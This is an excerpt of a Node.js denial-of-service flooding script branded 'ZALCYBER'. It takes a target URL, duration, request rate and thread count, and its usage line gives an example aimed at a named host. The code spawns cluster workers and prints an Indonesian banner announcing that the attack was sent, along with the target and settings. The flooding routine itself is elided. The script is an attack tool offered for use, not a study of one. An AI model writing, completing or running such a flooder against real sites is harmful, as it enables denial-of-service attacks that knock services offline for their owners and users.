 ...
 if (process.argv.length < 5){console.log(`Usage: node zal.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
 ...
 if (cluster.isMaster) {
    ...
    console.clear();
    console.log(`
\x1b[38;5;160m 𝙕𝘼𝙇𝘾𝙔𝘽𝙀𝙍
𝙎𝘾 𝙇𝙀𝘼𝙆? 𝙇𝘼𝙒𝘼𝙆 𝘾𝙄𝙆 𝘿𝙄 𝙆𝙄𝙍𝘼 𝙂𝘼 𝘽𝙄𝙎𝘼 𝘽𝙐𝘼𝙏 𝙎𝙀𝙉𝘿𝙄𝙍𝙄 𝙆𝙒𝙆𝙒𝙆𝙒𝙆
\x1b[0m`);
    console.log(``);
    console.log(``);
    console.log(`sorry ye Hati hati serangan ZALCYBER telah di kirim`);
    console.log('sorry ye Target: ' + parsedTarget.host + '\x1b[0m');
    console.log('sorry ye Time: ' + args.time + '\x1b[0m');
    console.log('sorry ye Threads: ' + args.threads + '\x1b[0m');
    console.log('sorry ye Requests per second: ' + args.Rate + '\x1b[0m');
    console.log(`sorry ye Status: Succes!`);
    console.log(``);
